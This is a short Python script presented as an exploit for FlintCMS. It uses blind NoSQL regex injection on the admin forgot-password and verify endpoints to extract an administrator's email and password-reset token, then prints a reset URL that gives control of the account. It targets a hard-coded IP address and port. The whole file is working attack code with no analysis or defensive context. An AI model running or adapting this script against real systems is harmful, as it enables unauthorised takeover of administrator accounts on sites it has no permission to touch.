#
# Custom script to exploit flintCMS.
# https://exchange.xforce.ibmcloud.com/vulnerabilities/148499
#
import requests
import string
import sys

charset = string.letters + string.digits + '@.'
url = "34.231.255.4:4000"


def blind(test, charset):
    done = False
    if 'test_email' in test.__str__():
        buf = ''
    else:
        buf = ''

    while not done:
        done = True

        for c in charset:
            if test(buf + c):
                buf += c
                done = False
                break

        print buf

    return buf


def test_email(email):
    content = requests.post('http://'+url+'/admin/forgotpassword', data={'email[$regex]': '^' + email}, allow_redirects=False).content

    return 'success' in content


def test_token(token):
    location = requests.get('http://'+url+'/admin/verify', params={'t[$regex]': '^' + token}, allow_redirects=False).headers['Location']

    return 'sp' in location


print 'Finding email...'

email = blind(test_email, charset)

print 'Reseting email of ' + email

requests.post('http://'+url+'/admin/forgotpassword', json={'email': email})

token = blind(test_token, charset)

print '------------------------------------------------'
print 'Email: ' + email
print 'Token: ' + token
print 'Reset URL: http://'+url+'/admin/sp/' + token